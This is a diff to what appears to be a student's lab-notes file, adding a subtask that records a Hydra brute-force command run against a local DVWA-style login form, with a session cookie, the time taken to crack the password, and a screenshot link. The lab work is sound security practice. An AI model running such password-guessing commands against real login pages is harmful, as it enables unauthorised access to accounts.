@@ -15,3 +15,9 @@ subtask3
 
 subtask4
 - <img width="1598" height="1386" alt="Näyttökuva 2026-10-02 164337" src="https://github.com/user-attachments/assets/158e3004-6680-40c2-b892-198ec64b02ae" />
+
+subtask5
+- command: docker run --network="host" vanhauser/hydra -V -f -I -l admin -x 4:4:a "http-get-form://localhost/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ocqp9kkrqr1bcu6sq61cpqakg2; security=low:F=Username and/or password incorrect."
+- it took almost 9 minutes to get the password
+- <img width="2296" height="272" alt="Näyttökuva 2026-10-02 214507" src="https://github.com/user-attachments/assets/0548a983-ab6d-4021-b7db-b1fa484ad005" />
+
